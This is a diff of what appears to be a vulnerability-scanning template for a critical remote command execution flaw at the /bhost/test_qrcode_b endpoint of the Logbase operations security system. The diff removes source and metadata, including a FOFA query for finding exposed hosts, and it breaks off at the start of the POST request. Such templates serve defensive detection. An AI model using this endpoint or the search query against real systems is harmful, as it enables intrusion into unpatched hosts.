@@ -3,12 +3,8 @@ info:
   name: 思福迪运维安全管理系统 test_qrcode_b 存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wwgdfe82xxdttddn'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wwgdfe82xxdttddn
-    fofa: body="Logbase运维安全管理系统"
 http:
 - raw:
   - 'POST /bhost/test_qrcode_b HTTP/1.1
